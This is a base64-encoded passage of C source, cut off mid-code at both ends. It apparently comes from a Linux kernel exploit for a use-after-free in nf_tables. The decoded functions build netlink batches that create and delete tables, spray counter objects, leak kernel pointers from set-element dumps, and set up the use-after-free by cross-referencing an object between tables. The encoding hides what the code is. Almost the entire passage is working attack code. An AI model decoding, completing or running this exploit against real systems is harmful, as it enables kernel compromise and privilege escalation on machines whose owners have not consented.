IE5MTV9GX0NSRUFURSwgc2VxKyspOwoJCW5mdG5sX3RhYmxlX25sbXNnX2J1
aWxkX3BheWxvYWQobmgsIHRhYmxlKTsKCQltbmxfbmxtc2dfYmF0Y2hfbmV4
dChiYXRjaCk7CgkJCgkJbmZ0bmxfYmF0Y2hfZW5kKG1ubF9ubG1zZ19iYXRj
aF9jdXJyZW50KGJhdGNoKSwgc2VxKyspOwoJCW1ubF9ubG1zZ19iYXRjaF9u
ZXh0KGJhdGNoKTsKCgkJciA9IG1ubF9zb2NrZXRfc2VuZHRvKHMsIG1ubF9u
bG1zZ19iYXRjaF9oZWFkKGJhdGNoKSwgbW5sX25sbXNnX2JhdGNoX3NpemUo
YmF0Y2gpKTsKCQlpZihyIDwgMCkKCQkJYnllKCJbLV0gRmFpbGVkIHRvIHNl
bmQgbWVzc2FnZSIpOwoJCQoJCWkrKzsKCX0KCglyZXR1cm47Cn0KCi8qIENh
bGxiYWNrIHNldGVsZW0gZ2V0ICovCnN0YXRpYyBpbnQgc2V0X2NiKGNvbnN0
IHN0cnVjdCBubG1zZ2hkciAqbmxoLCB2b2lkICpkYXRhKSB7CglzdHJ1Y3Qg
bmZ0bmxfc2V0ICp0OwoJY2hhciBidWZbNDA5Nl07Cgl1aW50MzJfdCAqdHlw
ZSA9IGRhdGE7CgoJdCA9IG5mdG5sX3NldF9hbGxvYygpOwoJaWYgKHQgPT0g
TlVMTCkgewoJCXBlcnJvcigiT09NIik7CgkJZ290byBlcnI7Cgl9CgoJaWYg
KG5mdG5sX3NldF9lbGVtc19ubG1zZ19wYXJzZShubGgsIHQpIDwgMCkgewoJ
CXBlcnJvcigibmZ0bmxfc2V0X25sbXNnX3BhcnNlIik7CgkJZ290byBlcnJf
ZnJlZTsKCX0KCgluZnRubF9zZXRfc25wcmludGYoYnVmLCBzaXplb2YoYnVm
KSwgdCwgKnR5cGUsIDApOwoKZXJyX2ZyZWU6CgluZnRubF9zZXRfZnJlZSh0
KTsKZXJyOgoJcmV0dXJuIE1OTF9DQl9PSzsKfQoKLyogUGFyc2Ugb2JqIG5h
bWUgcmV0cmlldmFsIG91dHB1dCBmb3IgcG9pbnRlciBwYXJzaW5nICovCnVp
bnQ2NF90IHBhcnNlX3VhZl9vYmpfbmFtZV9sZWFrKGNoYXIgKnRhYmxlLCBj
aGFyICpzZXQsIG9mZl90IG9mZiwgaW50IHApIHsKCXVpbnQ2NF90IHB0ciA9
IDA7CglzdHJ1Y3QgbW5sX3NvY2tldCAqbmwgPSBOVUxMOwoJY2hhciBidWZb
TU5MX1NPQ0tFVF9CVUZGRVJfU0laRV07CglzdHJ1Y3Qgbmxtc2doZHIgKm5s
aCA9IE5VTEw7Cgl1aW50MzJfdCBwb3J0aWQgPSAwLCBzZXEgPSAwOwoJdWlu
dDMyX3QgdHlwZSA9IE5GVE5MX09VVFBVVF9ERUZBVUxUOwoJc3RydWN0IG5m
dG5sX3NldCAqdCA9IE5VTEw7Cgl1aW50NjRfdCAqbGtfcCA9IE5VTEw7Cglp
bnQgcmV0ID0gMDsKCWludCBpID0gMDsKCQoJYXNzaWduX3RvX2NvcmUoREVG
X0NPUkUpOwoJCgl0ID0gbmZ0bmxfc2V0X2FsbG9jKCk7CglpZighdCkKCQli
eWUoIlstXSBFcnJvciBhdCBuZnRubF9zZXRfYWxsb2MoKSIpOwoKCW5saCA9
IG5mdG5sX3NldF9ubG1zZ19idWlsZF9oZHIoYnVmLCBORlRfTVNHX0dFVFNF
VEVMRU0sIE5GUFJPVE9fSVBWNCwgTkxNX0ZfRFVNUCB8IE5MTV9GX0FDSywg
c2VxKyspOwoJbmZ0bmxfc2V0X3NldCh0LCBORlROTF9TRVRfTkFNRSwgc2V0
KTsKCW5mdG5sX3NldF9zZXQodCwgTkZUTkxfU0VUX1RBQkxFLCB0YWJsZSk7
CgluZnRubF9zZXRfZWxlbXNfbmxtc2dfYnVpbGRfcGF5bG9hZChubGgsIHQp
OwoKCW5sID0gbW5sX3NvY2tldF9vcGVuKE5FVExJTktfTkVURklMVEVSKTsK
CWlmKCFubCkKCQlieWUoIlstXSBFcnJvciBhdCBtbmxfc29ja2V0X29wZW4o
KSIpOwoKCWlmKG1ubF9zb2NrZXRfYmluZChubCwgMCwgTU5MX1NPQ0tFVF9B
VVRPUElEKSA8IDApCgkJYnllKCJbLV0gRXJyb3IgYXQgbW5sX3NvY2tldF9i
aW5kKCkiKTsKCQkKCXBvcnRpZCA9IG1ubF9zb2NrZXRfZ2V0X3BvcnRpZChu
bCk7CgoJaWYobW5sX3NvY2tldF9zZW5kdG8obmwsIG5saCwgbmxoLT5ubG1z
Z19sZW4pIDwgMCkKCQlieWUoIlstXSBFcnJvciBhdCBtbmxfc29ja2V0X3Nl
bmR0bygpIik7CgoJcmV0ID0gbW5sX3NvY2tldF9yZWN2ZnJvbShubCwgYnVm
LCBzaXplb2YoYnVmKSk7Cgl3aGlsZSAocmV0ID4gMCkgewoJCXJldCA9IG1u
bF9jYl9ydW4oYnVmLCByZXQsIHNlcSwgcG9ydGlkLCBzZXRfY2IsICZ0eXBl
KTsKCQlpZiAocmV0IDw9IDApCgkJCWJyZWFrOwoJCXJldCA9IG1ubF9zb2Nr
ZXRfcmVjdmZyb20obmwsIGJ1Ziwgc2l6ZW9mKGJ1ZikpOwoJfQoJCgkvL2hl
eGR1bXAoYnVmLCA1MTIpOwoJCglpZihwKSB7CgkJd2hpbGUoaSA8IDUxMikg
ewoJCQlpZihidWZbaV0gPT0gJ1x4ZmYnICYmIGJ1ZltpKzFdID09ICdceGZm
JykgewoJCQkJaWYoaSA8PSA2KQoJCQkJCWJ5ZSgiWy1dIFVua25vd24gZGF0
YSIpOwoJCQkJLy9wdXRzKCJCIik7CgkJCQlsa19wID0gKHVpbnQ2NF90ICop
KChidWYgKyBpKS02KTsKCQkJCS8vcHJpbnRmKCJkZWJ1ZyAweCVseFxuIiwg
KmxrX3ApOwoJCQkJcmV0dXJuICpsa19wOwoJCQl9CgkJCWkrKzsKCQl9Cgl9
CgkKCWxrX3AgPSAodWludDY0X3QgKikoYnVmICsgb2ZmKTsKCQoJbW5sX3Nv
Y2tldF9jbG9zZShubCk7CgkKCXJldHVybiAqbGtfcDsKfQoKLyogU3ByYXkg
d2l0aCBuZnRfb2JqZWN0IGFsbG9jYXRpb25zICovCnVpbnQ2NF90IHNwcmF5
X25mdF9vYmplY3QoY2hhciAqdGFibGVfbmFtZSwgc2l6ZV90IG4sIGNoYXIg
KmxfdGFibGVfbmFtZSwgY2hhciAqbF9zZXRfbmFtZSkgewoJc3RydWN0IG1u
bF9zb2NrZXQgKnMgPSBOVUxMOwoJc3RydWN0IG1ubF9ubG1zZ19iYXRjaCAq
YmF0Y2ggPSBOVUxMOwoJc3RydWN0IG5sbXNnaGRyICpuaCA9IE5VTEw7Cglp
bnQgciA9IDAsIHNlcSA9IDA7CgljaGFyIGJ1ZlsxNjM4NF0gPSB7IDAgfTsK
CWNoYXIgKm9ial9uYW1lID0gTlVMTDsKCXN0cnVjdCBuZnRubF9vYmogKm9i
aiA9IE5VTEw7CglzaXplX3QgaSA9IDA7Cgl1aW50NjRfdCBsZWFrZWRfYWRk
ciA9IDA7CgkKCWFzc2lnbl90b19jb3JlKERFRl9DT1JFKTsKCQoJd2hpbGUo
aSA8IG4pIHsKCQkKCQlzID0gbW5sX3NvY2tldF9vcGVuKE5FVExJTktfTkVU
RklMVEVSKTsKCQlpZighcykKCQkJYnllKCJbLV0gRmFpbGVkIHRvIGNyZWF0
ZSBuZXRmaWx0ZXIgc29ja2V0Iik7CgkJCgkJc2VxID0gMDsKCQltZW1zZXQo
YnVmLCAwLCBzaXplb2YoYnVmKSk7CgkJCQoJCWJhdGNoID0gbW5sX25sbXNn
X2JhdGNoX3N0YXJ0KGJ1Ziwgc2l6ZW9mKGJ1ZikpOwoJCW5mdG5sX2JhdGNo
X2JlZ2luKG1ubF9ubG1zZ19iYXRjaF9jdXJyZW50KGJhdGNoKSwgc2VxKysp
OwoJCW1ubF9ubG1zZ19iYXRjaF9uZXh0KGJhdGNoKTsKCQkKCQlvYmpfbmFt
ZSA9IGdlbmVyYXRlX3JuZF9uYW1lKCk7CgkJCgkJb2JqID0gbmZ0bmxfb2Jq
X2FsbG9jKCk7CgkJbmZ0bmxfb2JqX3NldF9zdHIob2JqLCBORlROTF9PQkpf
TkFNRSwgb2JqX25hbWUpOwoJCW5mdG5sX29ial9zZXRfc3RyKG9iaiwgTkZU
TkxfT0JKX1RBQkxFLCB0YWJsZV9uYW1lKTsKCQluZnRubF9vYmpfc2V0X3Uz
MihvYmosIE5GVE5MX09CSl9UWVBFLCBORlRfT0JKRUNUX0NPVU5URVIpOwoJ
CW5mdG5sX29ial9zZXRfdTY0KG9iaiwgTkZUTkxfT0JKX0NUUl9CWVRFUywg
MCk7CgkJCgkJcHJpbnRmKCJcdFtpXSBDcmVhdGluZyBORlRfT0JKRUNUX0NP
VU5URVIgb2JqZWN0ICclcycuLi5cbiIsIG9ial9uYW1lKTsKCQkKCQluaCA9
IG5mdG5sX25sbXNnX2J1aWxkX2hkcihtbmxfbmxtc2dfYmF0Y2hfY3VycmVu
dChiYXRjaCksIE5GVF9NU0dfTkVXT0JKLCBORlBST1RPX0lQVjQsIE5MTV9G
X0NSRUFURSwgc2VxKyspOwoJCW5mdG5sX29ial9ubG1zZ19idWlsZF9wYXls
b2FkKG5oLCBvYmopOwoJCW1ubF9ubG1zZ19iYXRjaF9uZXh0KGJhdGNoKTsK
CQkKCQluZnRubF9iYXRjaF9lbmQobW5sX25sbXNnX2JhdGNoX2N1cnJlbnQo
YmF0Y2gpLCBzZXErKyk7CgkJbW5sX25sbXNnX2JhdGNoX25leHQoYmF0Y2gp
OwoKCQlyID0gbW5sX3NvY2tldF9zZW5kdG8ocywgbW5sX25sbXNnX2JhdGNo
X2hlYWQoYmF0Y2gpLCBtbmxfbmxtc2dfYmF0Y2hfc2l6ZShiYXRjaCkpOwoJ
CWlmKHIgPCAwKQoJCQlieWUoIlstXSBGYWlsZWQgdG8gc2VuZCBtZXNzYWdl
Iik7CgkJCQoJCXNsZWVwKDEuNCk7CgkJCgkJbGVha2VkX2FkZHIgPSBwYXJz
ZV91YWZfb2JqX25hbWVfbGVhayhsX3RhYmxlX25hbWUsIGxfc2V0X25hbWUs
IDB4NDAgKyAxMiwgMCk7CgkJLy9wcmludGYoIjB4JWx4XG4iLCBsZWFrZWRf
YWRkcik7CgkJaWYobGVha2VkX2FkZHIgIT0gMCAmJiAoKGxlYWtlZF9hZGRy
ICYgMHhmZmZmMDAwMDAwMDAwMDAwKSA9PSAweGZmZmYwMDAwMDAwMDAwMDAp
KQoJCQlicmVhazsKCQoJCWkrKzsKCX0KCQoJcmV0dXJuIGxlYWtlZF9hZGRy
Owp9CgovKiBEZWxldGUgYSBuZXRmaWx0ZXIgdGFibGUgKi8Kdm9pZCBkZWxl
dGVfdGFibGUoY2hhciAqdGFibGVfbmFtZSkgewoJc3RydWN0IG1ubF9zb2Nr
ZXQgKnMgPSBOVUxMOwoJc3RydWN0IG1ubF9ubG1zZ19iYXRjaCAqYmF0Y2gg
PSBOVUxMOwoJc3RydWN0IG5sbXNnaGRyICpuaCA9IE5VTEw7CglpbnQgciA9
IDA7CglpbnQgc2VxID0gMDsKCWNoYXIgYnVmWzE2Mzg0XSA9IHsgMCB9OwoJ
c3RydWN0IG5mdG5sX3RhYmxlICp0YWJsZSA9IE5VTEw7CgkKCWFzc2lnbl90
b19jb3JlKERFRl9DT1JFKTsKCQoJcyA9IG1ubF9zb2NrZXRfb3BlbihORVRM
SU5LX05FVEZJTFRFUik7CglpZighcykKCQlieWUoIlstXSBGYWlsZWQgdG8g
Y3JlYXRlIG5ldGZpbHRlciBzb2NrZXQiKTsKCgl0YWJsZSA9IG5mdG5sX3Rh
YmxlX2FsbG9jKCk7CgluZnRubF90YWJsZV9zZXRfc3RyKHRhYmxlLCBORlRO
TF9UQUJMRV9OQU1FLCB0YWJsZV9uYW1lKTsKCQoJYmF0Y2ggPSBtbmxfbmxt
c2dfYmF0Y2hfc3RhcnQoYnVmLCBzaXplb2YoYnVmKSk7CgluZnRubF9iYXRj
aF9iZWdpbihtbmxfbmxtc2dfYmF0Y2hfY3VycmVudChiYXRjaCksIHNlcSsr
KTsKCW1ubF9ubG1zZ19iYXRjaF9uZXh0KGJhdGNoKTsKCgluaCA9IG5mdG5s
X3RhYmxlX25sbXNnX2J1aWxkX2hkcihtbmxfbmxtc2dfYmF0Y2hfY3VycmVu
dChiYXRjaCksIE5GVF9NU0dfREVMVEFCTEUsIE5GUFJPVE9fSVBWNCwgTkxN
X0ZfQ1JFQVRFLCBzZXErKyk7CgluZnRubF90YWJsZV9ubG1zZ19idWlsZF9w
YXlsb2FkKG5oLCB0YWJsZSk7Cgltbmxfbmxtc2dfYmF0Y2hfbmV4dChiYXRj
aCk7CgoJbmZ0bmxfYmF0Y2hfZW5kKG1ubF9ubG1zZ19iYXRjaF9jdXJyZW50
KGJhdGNoKSwgc2VxKyspOwoJbW5sX25sbXNnX2JhdGNoX25leHQoYmF0Y2gp
OwoJCglyID0gbW5sX3NvY2tldF9zZW5kdG8ocywgbW5sX25sbXNnX2JhdGNo
X2hlYWQoYmF0Y2gpLCBtbmxfbmxtc2dfYmF0Y2hfc2l6ZShiYXRjaCkpOwoJ
aWYociA8IDApCgkJYnllKCJbLV0gRmFpbGVkIHRvIHNlbmQgbWVzc2FnZSIp
OwoJCglyZXR1cm47Cn0KCi8qIFBhdXNlIGZ1bmN0aW9uIGZvciBkZWJ1Z2dp
bmcgcHVycG9zZXMgKi8Kdm9pZCBwYXVzZV94KHZvaWQpIHsKCWNoYXIgYyA9
IDA7CglpbnQgciA9IDA7CglwdXRzKCJbaV0gUHJlc3MgYW55IGtleSB0byBj
b250aW51ZS4uLiIpOwoJciA9IHJlYWQoMCwgJmMsIHNpemVvZihjaGFyKSk7
CglpZihyIDwgMCkKCQlieWUoIlstXSBFcnJvciBmcm9tIHBhdXNlX3goKSIp
OwoJcmV0dXJuOwp9CgovKiBSZXBlYXQgYSBjaGFyIG4gdGltZXMgYW5kIHJl
dHVybiBhIHN0cmluZyAqLwpjaGFyICpzdHJfcmVwZWF0KGNoYXIgYywgc2l6
ZV90IG4pIHsKCWNoYXIgKnB0ciA9IGNhbGxvYyhuICsgMSwgc2l6ZW9mKGNo
YXIpKTsKCWlmKCFwdHIpCgkJYnllKCJbLV0gRXJyb3IgYXQgY2FsbG9jKCki
KTsKCQoJZm9yKGludCBpID0gMCA7IGkgPCBuIDsgaSsrKQoJCXB0cltpXSA9
IGM7CgkKCXJldHVybiBwdHI7Cn0KCi8qIENyZWF0ZSBhIG5ldGZpbHRlciB0
YWJsZSAqLwp2b2lkIGNyZWF0ZV90YWJsZShjaGFyICp0YWJsZV9uYW1lKSB7
CglzdHJ1Y3QgbW5sX3NvY2tldCAqcyA9IE5VTEw7CglzdHJ1Y3QgbW5sX25s
bXNnX2JhdGNoICpiYXRjaCA9IE5VTEw7CglzdHJ1Y3Qgbmxtc2doZHIgKm5o
ID0gTlVMTDsKCWludCByID0gMDsKCWludCBzZXEgPSAwOwoJY2hhciBidWZb
MTYzODRdID0geyAwIH07CglzdHJ1Y3QgbmZ0bmxfdGFibGUgKnRhYmxlID0g
TlVMTDsKCQoJdGFibGUgPSBuZnRubF90YWJsZV9hbGxvYygpOwoJbmZ0bmxf
dGFibGVfc2V0X3N0cih0YWJsZSwgTkZUTkxfVEFCTEVfTkFNRSwgdGFibGVf
bmFtZSk7CgoJcyA9IG1ubF9zb2NrZXRfb3BlbihORVRMSU5LX05FVEZJTFRF
Uik7CglpZighcykKCQlieWUoIlstXSBGYWlsZWQgdG8gY3JlYXRlIG5ldGZp
bHRlciBzb2NrZXQiKTsKCgliYXRjaCA9IG1ubF9ubG1zZ19iYXRjaF9zdGFy
dChidWYsIHNpemVvZihidWYpKTsKCW5mdG5sX2JhdGNoX2JlZ2luKG1ubF9u
bG1zZ19iYXRjaF9jdXJyZW50KGJhdGNoKSwgc2VxKyspOwoJbW5sX25sbXNn
X2JhdGNoX25leHQoYmF0Y2gpOwoKCW5oID0gbmZ0bmxfdGFibGVfbmxtc2df
YnVpbGRfaGRyKG1ubF9ubG1zZ19iYXRjaF9jdXJyZW50KGJhdGNoKSwgTkZU
X01TR19ORVdUQUJMRSwgTkZQUk9UT19JUFY0LCBOTE1fRl9DUkVBVEUsIHNl
cSsrKTsKCW5mdG5sX3RhYmxlX25sbXNnX2J1aWxkX3BheWxvYWQobmgsIHRh
YmxlKTsKCW1ubF9ubG1zZ19iYXRjaF9uZXh0KGJhdGNoKTsKCQoJbmZ0bmxf
YmF0Y2hfZW5kKG1ubF9ubG1zZ19iYXRjaF9jdXJyZW50KGJhdGNoKSwgc2Vx
KyspOwoJbW5sX25sbXNnX2JhdGNoX25leHQoYmF0Y2gpOwoKCXIgPSBtbmxf
c29ja2V0X3NlbmR0byhzLCBtbmxfbmxtc2dfYmF0Y2hfaGVhZChiYXRjaCks
IG1ubF9ubG1zZ19iYXRjaF9zaXplKGJhdGNoKSk7CglpZihyIDwgMCkKCQli
eWUoIlstXSBGYWlsZWQgdG8gc2VuZCBtZXNzYWdlIik7CgkKCQkKCXJldHVy
bjsKfQoKLyogUHJlcGFyZSBhIFVBRiBjb25kaXRpb24gYnkgY3Jvc3MtcmVm
ZXJlbmNpbmcgYW4gb2JqZWN0IGZyb20gb25lIHRhYmxlIHRvIGFub3RoZXIg
Ki8Kdm9pZCBjcmVhdGVfdWFmKGNoYXIgKnRhYmxlXzEsIGNoYXIgKnRhYmxl
XzIsIGNoYXIgKm9ial9uLCBjaGFyICpzZXRfbiwgb2JqX3Qgb2JqX3R5cGUs
IGludCBpc19zX3RyaWNrLCBjaGFyICpzX3RyaWNrX25hbWUsIGludCB4KSB7
CglzdHJ1Y3QgbW5sX3NvY2tldCAqcyA9IE5VTEw7CglzdHJ1Y3QgbW5sX25s
bXNnX2JhdGNoICpiYXRjaCA9IE5VTEw7CglzdHJ1Y3Qgbmxtc2doZHIgKm5o
ID0gTlVMTDsKCWludCByID0gMDsKCWludCBzZXEgPSAwOwoJdWludDE2X3Qg
a2xlbls2NF0gPSB7IDEgfTsKCWNoYXIgYnVmWzE2Mzg0XSA9IHsgMCB9OwoJ
c3RydWN0IG5mdG5sX3RhYmxlICp0YWJsZSA9IE5VTEw7CglzdHJ1Y3QgbmZ0
bmxfdGFibGUgKnRhYmxlMiA9IE5VTEw7CglzdHJ1Y3QgbmZ0bmxfdGFibGUg
KnRhYmxlMyA9IE5VTEw7CglzdHJ1Y3QgbmZ0bmxfc2V0X2VsZW0gKnNsZW0g
PSBOVUxMOwoJc3RydWN0IG5mdG5sX29iaiAqb2JqID0gTlVMTDsKCXN0cnVj
dCBuZnRubF9zZXQgKnN4ID0gTlVMTDsKCXN0cnVjdCBuZnRubF9zZXQgKnNl
dCA9IE5VTEw7CglzdHJ1Y3QgbmZ0bmxfY2hhaW4gKmNoYWluID0gTlVMTDsK
CQoJaWYob2JqX3R5cGUgPT0gT0JKRUNUX1RZUEVfVU5LTk9XTikKCQlieWUo
IlstXSBVbmtub3duIG9iamVjdCB0eXBlIik7CgoJcyA9IG1ubF9zb2NrZXRf
b3BlbihORVRMSU5LX05FVEZJTFRFUik7CglpZighcykKCQlieWUoIlstXSBG
YWlsZWQgdG8gY3JlYXRlIG5ldGZpbHRlciBzb2NrZXQiKTsKCgkKCXRhYmxl
ID0gbmZ0bmxfdGFibGVfYWxsb2MoKTsKCW5mdG5sX3RhYmxlX3NldF9zdHIo
dGFibGUsIE5GVE5MX1RBQkxFX05BTUUsIHRhYmxlXzEpOwoKCXRhYmxlMiA9
IG5mdG5sX3RhYmxlX2FsbG9jKCk7CgluZnRubF90YWJsZV9zZXRfc3RyKHRh
YmxlMiwgTkZUTkxfVEFCTEVfTkFNRSwgdGFibGVfMik7CgkKCWlmKGlzX3Nf
dHJpY2spIHsKCQl0YWJsZTMgPSBuZnRubF90YWJsZV9hbGxvYygpOwoJCW5m
dG5sX3RhYmxlX3NldF9zdHIodGFibGUzLCBORlROTF9UQUJMRV9OQU1FLCBz
X3RyaWNrX25hbWUpOwoJfQoJCglvYmogPSBuZnRubF9vYmpfYWxsb2MoKTsK
CW5mdG5sX29ial9zZXRfc3RyKG9iaiwgTkZUTkxfT0JKX05BTUUsIG9ial9u
KTsKCW5mdG5sX29ial9zZXRfc3RyKG9iaiwgTkZUTkxfT0JKX1RBQkxFLCB0
YWJsZV8xKTsKCQoJaWYoeCkgewoJCWNoYWluID0gbmZ0bmxfY2hhaW5fYWxs
b2MoKTsKCQluZnRubF9jaGFpbl9zZXQoY2hhaW4sIE5GVE5MX0NIQUlOX05B
TUUsIENIQUlOX1JQX1VBRik7CgkJbmZ0bmxfY2hhaW5fc2V0KGNoYWluLCBO
RlROTF9DSEFJTl9UQUJMRSwgdGFibGVfMik7CgkJbmZ0bmxfY2hhaW5fc2V0
X2RhdGEoY2hhaW4sIE5GVE5MX0NIQUlOX1RZUEUsIHN0cmR1cCgiZmlsdGVy
IiksIDApOwoJCW5mdG5sX2NoYWluX3NldF91MzIoY2hhaW4sIE5GVE5MX0NI
QUlOX0hPT0tOVU0sIE5GX0lORVRfTE9DQUxfT1VUKTsKCQluZnRubF9jaGFp
bl9zZXRfdTMyKGNoYWluLCBORlROTF9DSEFJTl9QUklPLCAwKTsKCX0KCQoJ
aWYob2JqX3R5cGUgPT0gT0JKRUNUX1RZUEVfTElNSVQpIHsKCQluZnRubF9v
Ympfc2V0X3UzMihvYmosIE5GVE5MX09CSl9UWVBFLCBORlRfT0JKRUNUX0xJ
TUlUKTsKCQluZnRubF9vYmpfc2V0X3U2NChvYmosIE5GVE5MX09CSl9MSU1J
VF9SQVRFLCAxKTsgCgkJbmZ0bmxfb2JqX3NldF91NjQob2JqLCBORlROTF9P
QkpfTElNSVRfVU5JVCwgMSk7Cgl9IGVsc2UgaWYob2JqX3R5cGUgPT0gT0JK
RUNUX1RZUEVfQ09VTlRFUikgewoJCW5mdG5sX29ial9zZXRfdTMyKG9iaiwg
TkZUTkxfT0JKX1RZUEUsIE5GVF9PQkpFQ1RfQ09VTlRFUik7CgkJbmZ0bmxf
b2JqX3NldF91NjQob2JqLCBORlROTF9PQkpfQ1RSX0JZVEVTLCAwKTsKCX0g
ZWxzZQoJCWJ5ZSgiWy1dIFVua25vd24gb2JqZWN0IHR5cGUiKTsKCglzZXQg
PSBuZnRubF9zZXRfYWxsb2MoKTsKCW5mdG5sX3NldF9zZXRfc3RyKHNldCwg
TkZUTkxfU0VUX05BTUUsIHNldF9uKTsKCW5mdG5sX3NldF9zZXRfc3RyKHNl
dCwgTkZUTkxfU0VUX1RBQkxFLCB0YWJsZV8yKTsKCW5mdG5sX3NldF9zZXRf
dTMyKHNldCwgTkZUTkxfU0VUX0ZBTUlMWSwgTkZQUk9UT19JUFY0KTsKCW5m
dG5sX3NldF9zZXRfdTMyKHNldCwgTkZUTkxfU0VUX0tFWV9MRU4sIHNpemVv
Zih1aW50MTZfdCkpOwoJbmZ0bmxfc2V0X3NldF91MzIoc2V0LCBORlROTF9T
RVRfS0VZX1RZUEUsIDEzKTsKCW5mdG5sX3NldF9zZXRfdTMyKHNldCwgTkZU
TkxfU0VUX0lELCBodG9ubCgweGNhZmUpKTsKCW5mdG5sX3NldF9zZXRfdTMy
KHNldCwgTkZUTkxfU0VUX0ZMQUdTLCBORlRfU0VUX09CSkVDVCk7IC8vIE5G
VF9TRVRfQU5PTllNT1VTCgkKCWlmKG9ial90eXBlID09IE9CSkVDVF9UWVBF
X0xJTUlUKQoJCW5mdG5sX3NldF9zZXRfdTMyKHNldCwgTkZUTkxfU0VUX09C
Sl9UWVBFLCBORlRfT0JKRUNUX0xJTUlUKTsKCWVsc2UgaWYob2JqX3R5cGUg
PT0gT0JKRUNUX1RZUEVfQ09VTlRFUikKCQluZnRubF9zZXRfc2V0X3UzMihz
ZXQsIE5GVE5MX1NFVF9PQkpfVFlQRSwgTkZUX09CSkVDVF9DT1VOVEVSKTsK
CWVsc2UKCQlieWUoIlstXSBVbmtub3duIG9iamVjdCB0eXBlIik7CgoJc3gg
PSBuZnRubF9zZXRfYWxsb2MoKTsKCW5mdG5sX3NldF9zZXRfc3RyKHN4LCBO
RlROTF9TRVRfVEFCTEUsIHRhYmxlXzEpOwoJbmZ0bmxfc2V0X3NldF91MzIo
c3gsIE5GVE5MX1NFVF9JRCwgaHRvbmwoMHhjYWZlKSk7CgkKCWtsZW5bMF0g
PSBodG9ucyhUUklHX1BPUlQpOwoJCglzbGVtID0gbmZ0bmxfc2V0X2VsZW1f
YWxsb2MoKTsKCW5mdG5sX3NldF9lbGVtX3NldChzbGVtLCBORlROTF9TRVRf
RUxFTV9LRVksICZrbGVuLCBzaXplb2YodWludDE2X3QpKTsKCW5mdG5sX3Nl
dF9lbGVtX3NldF9zdHIoc2xlbSwgTkZUTkxfU0VUX0VMRU1fT0JKUkVGLCBv
Ympfbik7CgluZnRubF9zZXRfZWxlbV9hZGQoc3gsIHNsZW0pOwoJCgliYXRj
aCA9IG1ubF9ubG1zZ19iYXRjaF9zdGFydChidWYsIHNpemVvZihidWYpKTsK
CW5mdG5sX2JhdGNoX2JlZ2luKG1ubF9ubG1zZ19iYXRjaF9jdXJyZW50KGJh
dGNoKSwgc2VxKyspOwoJbW5sX25sbXNnX2JhdGNoX25leHQoYmF0Y2gpOwoK
CW5oID0gbmZ0bmxfdGFibGVfbmxtc2dfYnVpbGRfaGRyKG1ubF9ubG1zZ19i
YXRjaF9jdXJyZW50KGJhdGNoKSwgTkZUX01TR19ORVdUQUJMRSwgTkZQUk9U
T19JUFY0LCBOTE1fRl9DUkVBVEUsIHNlcSsrKTsKCW5mdG5sX3RhYmxlX25s
bXNnX2J1aWxkX3BheWxvYWQobmgsIHRhYmxlKTsKCW1ubF9ubG1zZ19iYXRj
aF9uZXh0KGJhdGNoKTsKCgluaCA9IG5mdG5sX3RhYmxlX25sbXNnX2J1aWxk
X2hkcihtbmxfbmxtc2dfYmF0Y2hfY3VycmVudChiYXRjaCksIE5GVF9NU0df
TkVXVEFCTEUsIE5GUFJPVE9fSVBWNCwgTkxNX0ZfQ1JFQVRFLCBzZXErKyk7
CgluZnRubF90YWJsZV9ubG1zZ19idWlsZF9wYXlsb2FkKG5oLCB0YWJsZTIp
OwoJbW5sX25sbXNnX2JhdGNoX25leHQoYmF0Y2gpOwoJCglpZihpc19zX3Ry
aWNrKSB7CgkJbmggPSBuZnRubF90YWJsZV9ubG1zZ19idWlsZF9oZHIobW5s
X25sbXNnX2JhdGNoX2N1cnJlbnQoYmF0Y2gpLCBORlRfTVNHX05FV1RBQkxF
LCBORlBST1RPX0lQVjQsIE5MTV9GX0NSRUFURSwgc2VxKyspOwoJCW5mdG5s
X3RhYmxlX25sbXNnX2J1aWxkX3BheWxvYWQobmgsIHRhYmxlMyk7CgkJbW5s
X25sbXNnX2JhdGNoX25leHQoYmF0Y2gpOwoJfQoJCgluaCA9IG5mdG5sX25s
bXNnX2J1aWxkX2hkcihtbmxfbmxtc2dfYmF0Y2hfY3VycmVudChiYXRjaCks
IE5GVF9NU0dfTkVXT0JKLCBORlBST1RPX0lQVjQsIE5MTV9GX0NSRUFURSwg
c2VxKyspOwoJbmZ0bmxfb2JqX25sbXNnX2J1aWxkX3BheWxvYWQobmgsIG9i
aik7Cgltbmxfbmxtc2dfYmF0Y2hfbmV4dChiYXRjaCk7CgkKCWlmKHgpIHsK
CQluaCA9IG5mdG5sX25sbXNnX2J1aWxkX2hkcihtbmxfbmxtc2dfYmF0Y2hf
Y3VycmVudChiYXRjaCksIE5GVF9NU0dfTkVXQ0hBSU4sIE5GUFJPVE9fSVBW
NCwgTkxNX0ZfQ1JFQVRFLCBzZXErKyk7CgkJbmZ0bmxfY2hhaW5fbmxtc2df
YnVpbGRfcGF5bG9hZChuaCwgY2hhaW4pOwoJCW1ubF9ubG1zZ19iYXRjaF9u
ZXh0KGJhdGNoKTsKCX0KCQoJbmggPSBuZnRubF9zZXRfbmxtc2dfYnVpbGRf
aGRyKG1ubF9ubG1zZ19iYXRjaF9jdXJyZW50KGJhdGNoKSwgTkZUX01TR19O
RVdTRVQsIE5GUFJPVE9fSVBWNCwgTkxNX0ZfQ1JFQVRFLCBzZXErKyk7Cglu
ZnRubF9zZXRfbmxtc2dfYnVpbGRfcGF5bG9hZChuaCwgc2V0KTsKCW1ubF9u
bG1zZ19iYXRjaF9uZXh0KGJhdGNoKTsKCQoJbmggPSBuZnRubF9ubG1zZ19i
dWlsZF9oZHIobW5sX25sbXNnX2JhdGNoX2N1cnJlbnQoYmF0Y2gpLCBORlRf
TVNHX05FV1NFVEVMRU0sIE5GUFJPVE9fSVBWNCwgTkxNX0ZfQ1JFQVRFLCBz
ZXErKyk7CgluZnRubF9zZXRfZWxlbXNfbmxtc2dfYnVpbGRfcGF5bG9hZChu
aCwgc3gpOwoJbW5sX25sbXNnX2JhdGNoX25leHQoYmF0Y2gpOwoKCW5mdG5s
X2JhdGNoX2VuZChtbmxfbmxtc2dfYmF0Y2hfY3VycmVudChiYXRjaCksIHNl
cSsrKTsKCW1ubF9ubG1zZ19iYXRjaF9uZXh0KGJhdGNoKTsKCglyID0gbW5s
X3NvY2tldF9zZW5kdG8ocywgbW5sX25sbXNnX2JhdGNoX2hlYWQoYmF0Y2gp
LCBtbmxfbmxtc2dfYmF0Y2hfc2l6ZShiYXRjaCkpOwoJaWYociA8IDApCgkJ
